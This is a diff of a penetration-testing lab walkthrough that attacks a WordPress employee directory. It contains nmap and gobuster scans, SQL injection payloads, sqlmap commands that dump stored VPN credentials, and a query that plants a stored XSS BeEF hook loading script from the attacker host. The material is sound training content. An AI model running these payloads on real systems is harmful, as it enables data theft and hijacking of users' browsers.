@@ -8,27 +8,31 @@ Welcome to the Red Team Training Lab. You will play the role of a penetration te
 
 ```
                     INTERNET (172.16.0.0/24)
-                    +-----------------------+
-                    |  kali (172.16.0.10)   |  <-- Your Attack Box
-                    |  redir1 (172.16.0.20) |
-                    |  redir2 (172.16.0.21) |
-                    +-----------+-----------+
+                    +---------------------------+
+                    |  kali (172.16.0.10)       |  <-- Your Attack Box
+                    |  redir1 (172.16.0.20)     |
+                    |  redir2 (172.16.0.21)     |
+                    |  webserver (172.16.0.100) |  <-- WordPress (your target!)
+                    +-----------+---------------+
                                 |
                     ============|============  (Firewall)
                                 |
                     DMZ (172.16.1.0/24)
                     +-----------------------+
-                    | webserver (172.16.1.10)|  <-- WordPress Site
+                    | webserver (172.16.1.10) |  <-- Same server, internal IP
                     +-----------+-----------+
                                 |
                     ============|============  (Firewall)
                                 |
                     INTERNAL (172.16.2.0/24)
                     +-----------------------+
-                    | WIN-DC01 (172.16.2.10) |  <-- Domain Controller
+                    | DC01 (172.16.2.10)     |  <-- Domain Controller
                     | fileserver (.2.20)     |  <-- SMB File Server
                     | ws01 (172.16.2.30)     |  <-- Employee Workstation
                     +-----------------------+
+
+Note: The webserver is multi-homed - accessible from your network at
+172.16.0.100 and internally at 172.16.1.10.
 ```
 
 ### Learning Objectives
@@ -61,13 +65,13 @@ You should see `172.16.0.10` - you're on the "internet" network, simulating an e
 Let's discover what hosts are reachable from our position.
 
 ```bash
-# Scan the DMZ network (where public-facing servers typically live)
-nmap -sn 172.16.1.0/24
+# Scan your network (the "Internet" segment where attackers start)
+nmap -sn 172.16.0.0/24
 ```
 
 **What you're doing:** This performs a ping sweep to find live hosts without doing a full port scan. The `-sn` flag means "no port scan" - just host discovery.
 
-**Expected result:** You should find `172.16.1.10` (webserver) is alive.
+**Expected result:** You should find several hosts including `172.16.0.100` (webserver) - this is your primary target.
 
 ### 1.3 Service Enumeration
 
@@ -75,7 +79,7 @@ Now let's see what services are running on the discovered host.
 
 ```bash
 # Full port scan with service detection
-nmap -sV -sC -p- 172.16.1.10
+nmap -sV -sC 172.16.0.100
 ```
 
 **What the flags mean:**
@@ -97,10 +101,10 @@ Let's explore the web application.
 
 ```bash
 # Open the website in a browser or use curl
-curl -s http://172.16.1.10 | head -50
+curl -s http://172.16.0.100 | head -50
 ```
 
-Or open Firefox and navigate to `http://172.16.1.10`
+Or open Firefox and navigate to `http://172.16.0.100`
 
 **What you're looking for:**
 - Technology stack (WordPress, custom app, etc.)
@@ -113,7 +117,7 @@ Let's find hidden directories and pages.
 
 ```bash
 # Use gobuster to find directories
-gobuster dir -u http://172.16.1.10 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt
 ```
 
 **What you're doing:** Brute-forcing common directory names to find hidden content.
@@ -124,14 +128,14 @@ gobuster dir -u http://172.16.1.10 -w /usr/share/wordlists/dirb/common.txt
 
 Navigate to the Employee Directory page:
 ```
-http://172.16.1.10/employee-directory/
+http://172.16.0.100/employee-directory/
 ```
 
 You'll see a search box. Let's test if it's vulnerable to SQL injection.
 
 ```bash
 # Test with a single quote to see if we get an error
-curl "http://172.16.1.10/employee-directory/?search='"
+curl "http://172.16.0.100/employee-directory/?search='"
 ```
 
 **What you're doing:** The single quote (`'`) breaks SQL syntax if input isn't sanitized. If the app is vulnerable, you'll see an error or unexpected behavior.
@@ -142,10 +146,10 @@ Try a boolean-based test:
 
 ```bash
 # This should return results (always true)
-curl "http://172.16.1.10/employee-directory/?search=' OR '1'='1"
+curl "http://172.16.0.100/employee-directory/?search=' OR '1'='1"
 
 # This should return nothing (always false)
-curl "http://172.16.1.10/employee-directory/?search=' AND '1'='2"
+curl "http://172.16.0.100/employee-directory/?search=' AND '1'='2"
 ```
 
 **Understanding the attack:**
@@ -159,7 +163,7 @@ Now let's use sqlmap to automate the extraction:
 
 ```bash
 # Let sqlmap identify the vulnerability
-sqlmap -u "http://172.16.1.10/employee-directory/?search=test" --batch
+sqlmap -u "http://172.16.0.100/employee-directory/?search=test" --batch
 ```
 
 **What `--batch` does:** Accepts default answers to all prompts (useful for automation).
@@ -168,12 +172,12 @@ Once confirmed, let's enumerate the database:
 
 ```bash
 # List all databases
-sqlmap -u "http://172.16.1.10/employee-directory/?search=test" --dbs --batch
+sqlmap -u "http://172.16.0.100/employee-directory/?search=test" --dbs --batch
 ```
 
 ```bash
 # List tables in the WordPress database
-sqlmap -u "http://172.16.1.10/employee-directory/?search=test" -D wordpress --tables --batch
+sqlmap -u "http://172.16.0.100/employee-directory/?search=test" -D wordpress --tables --batch
 ```
 
 **Expected result:** You should see a table called `wp_acme_employees`.
@@ -182,7 +186,7 @@ sqlmap -u "http://172.16.1.10/employee-directory/?search=test" -D wordpress --ta
 
 ```bash
 # Dump the employee table
-sqlmap -u "http://172.16.1.10/employee-directory/?search=test" -D wordpress -T wp_acme_employees --dump --batch
+sqlmap -u "http://172.16.0.100/employee-directory/?search=test" -D wordpress -T wp_acme_employees --dump --batch
 ```
 
 **CRITICAL FINDING:** The output reveals VPN credentials stored in plaintext:
@@ -294,7 +298,7 @@ We can use SQL injection to UPDATE an employee's notes field with our BeEF hook:
 
 ```bash
 # Using sqlmap to inject our XSS payload
-sqlmap -u "http://172.16.1.10/employee-directory/?search=test" \
+sqlmap -u "http://172.16.0.100/employee-directory/?search=test" \
   --sql-query="UPDATE wp_acme_employees SET notes='<script src=\"http://172.16.0.10:3000/hook.js\"></script>' WHERE employee_id='EMP001'"
 ```
 
@@ -415,7 +419,7 @@ Here's the complete attack chain you executed:
 ```
 1. RECONNAISSANCE
    └── Network scanning with nmap
-       └── Found webserver at 172.16.1.10
+       └── Found webserver at 172.16.0.100
 
 2. WEB APPLICATION ATTACK
    └── Discovered WordPress Employee Directory
